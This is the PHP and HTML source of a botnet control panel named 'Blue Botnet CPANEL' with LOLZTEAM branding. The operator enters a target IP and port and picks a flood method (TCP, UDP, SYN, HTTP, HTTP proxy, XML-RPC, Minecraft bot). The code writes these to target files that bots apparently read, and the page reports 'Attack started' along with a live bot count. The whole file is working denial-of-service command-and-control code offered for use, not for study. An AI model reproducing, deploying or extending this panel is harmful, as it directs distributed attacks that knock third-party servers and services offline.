<?php
error_reporting(E_ERROR | E_PARSE);
if (file_exists("phash") == false){
	header("Location: register.php");
} else {
	$filename = "phash";
	$fp = fopen($filename, "r");
	$content = fread($fp, filesize($filename));
	fclose($fp);
	$storedPassHash = $content;
	$passHash = $_COOKIE['phash'];
	if (md5("randomsalt".$passHash) != $storedPassHash){
		header("Location: login.php");
	} else {
		$ip = $_POST['ipaddress'];
		$port = $_POST['port'];
		$method = $_POST['method'];

		if ($ip == "STOP")
			$method = "STOP";

		if ($ip == "")
			$ip = $_GET['ipaddress'];
		if ($port == "")
			$port = $_GET['port'];
		if ($method == "")
			$method = $_GET['method'];

		if ($ip != ""){
			$fh = fopen("target", 'w+');
			fwrite($fh, $ip.'|'.$port.'|'.$method);
			fclose($fh);
			$fh = fopen("target.ip", 'w+');
			fwrite($fh, $ip);
			fclose($fh);
			$fh = fopen("target.port", 'w+');
			fwrite($fh, $port);
			fclose($fh);
			$fh = fopen("target.method", 'w+');
			fwrite($fh, $method);
			fclose($fh);
			if ($method != "STOP")
				echo '<div class="alert alert-success alert-dismissable">		<button type="button" class="close" data-dismiss="alert">&times;</button>		Attack started	</div>	';
			else
				echo '<div class="alert alert-danger alert-dismissable">		<button type="button" class="close" data-dismiss="alert">&times;</button>		Attack stopped	</div>	';
		}
	}
}
?><!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" ><![endif]-->
<!--[if gt IE 8]><!--><html class="no-js" ><!--<![endif]-->
<html>
 <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LOLZTEAM.COM | Blue Botnet CPANEL</title>
  <!-- Fogli di stile -->
  <link href="css/bootstrap.css" rel="stylesheet" media="screen">
  <link href="css/stili-custom.css" rel="stylesheet" media="screen">
  <!-- Modernizr -->
  <script src="js/modernizr.custom.js"></script>
  <style>
  body {background-color:#C4D5E5;}
  .tce {
	margin-left: auto !important;
    margin-right: auto !important;
	width:520px !important;
	max-width:520px !important;
  }

  </style>
  <!-- respond.js per IE8 -->
  <!--[if lt IE 9]>
  <script src="js/respond.min.js"></script>
  <![endif]-->
 </head>
 <body bgcolor="#C4D5E5">
<!--<center>-->
<br>
<div class="tce"><br>
	<div class="panel panel-default">
 <div class="panel-heading">
  <h3 class="panel-title">Blue Botnet CPANEL</h3>
 </div>
 <div class="panel-body">
 <form action="index.php" method="post">
	<ul class="nav nav-pills">
	 <li class="active"><a href="#">Attack Hub</a></li>
	 <li><a href="settings.php">Settings</a></li>
	 <li><a href="onlinebots.php">Online Bots</a></li>
	 <li><a href="logout.php">Logout</a></li>
	</ul><br><br>
	<div class="form-group"> 
		<label for="IP">IP</label>
		<input class="form-control" placeholder="IP" type="text" name="ipaddress">
	</div>
    <div class="form-group">
		<label for="Port">Port</label>
		<input class="form-control" placeholder="Port" type="text" name="port">
	</div>
	<div class="form-group">
   <label for="stato">Method</label>
   <select name="method" class="form-control" id="method">
    <option value="TCP">TCP</option>
    <option value="UDP">UDP</option>
    <option value="HTTPROXY">HTTPROXY</option>
	<option value="HTTP">HTTP</option>
	<option value="SYN">SYN</option>
	<option value="PRESS">XML-RPC</option>
	<option value="MCBOT">MCBOT</option>
	<option value="MCBOTALPHA">MCBOTALPHA</option>
   </select>
  </div>
	<button type="submit" class="btn btn-default">START</button>
	<button type="submit" onclick="form = document.forms[0];form['port'].value='STOP'; form['ipaddress'].value='STOP';" class="btn btn-default">STOP</button>
</form><br><br>
<label for="runat">Running Attack</label><br>
<table class="table table-bordered">
  <thead>
    <tr>
      <th>IP</th>
      <th>Port</th>
      <th>Method</th>
	  <th>Online Bots</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><?php
			$filename = "target.ip";
			$fp = fopen($filename, "r");
			$content = fread($fp, filesize($filename));
			fclose($fp);
			echo $content;
		?></td>
      <td><?php
			$filename = "target.port";
			$fp = fopen($filename, "r");
			$content = fread($fp, filesize($filename));
			fclose($fp);
			echo $content;
		?></td>
      <td><?php
			$filename = "target.method";
			$fp = fopen($filename, "r");
			$content = fread($fp, filesize($filename));
			fclose($fp);
			echo $content;
		?></td>
		<td><?php
				$dataFile = "visitors.txt";

				$sessionTime = 5; //this is the time in **minutes** to consider someone online before removing them from our file

				//Please do not edit bellow this line

				error_reporting(E_ERROR | E_PARSE);

				if(!file_exists($dataFile)) {
					$fp = fopen($dataFile, "w+");
					fclose($fp);
				}

				$ip = $_SERVER['REMOTE_ADDR'];
				$users = array();
				$onusers = array();

				//getting
				$fp = fopen($dataFile, "r");
				flock($fp, LOCK_SH);
				while(!feof($fp)) {
					$users[] = rtrim(fgets($fp, 32));
				}
				flock($fp, LOCK_UN);
				fclose($fp);


				//cleaning
				$x = 0;
				$alreadyIn = FALSE;
				foreach($users as $key => $data) {
					list( , $lastvisit) = explode("|", $data);
					if(time() - $lastvisit >= $sessionTime * 60) {
						$users[$x] = "";
					} else {
						if(strpos($data, $ip) !== FALSE) {
							$alreadyIn = TRUE;
							$users[$x] = "$ip|" . time(); //updating
						}
					}
					$x++;
				}

				//writing
				$fp = fopen($dataFile, "w+");
				flock($fp, LOCK_EX);
				$i = 0;
				foreach($users as $single) {
					if($single != "") {
						fwrite($fp, $single . "\r\n");
						$i++;
					}
				}
				flock($fp, LOCK_UN);
				fclose($fp);

				if($uo_keepquiet != TRUE) {
					echo $i;
				}
			?></td>
    </tr>
  </tbody>
</table>
 </div>
</div>
</div>
<!--</center>-->
 <br>
 <!-- jQuery e plugin JavaScript  -->
 <script src="http://code.jquery.com/jquery.js"></script>
 <script src="js/bootstrap.min.js"></script>
 </body>
</html>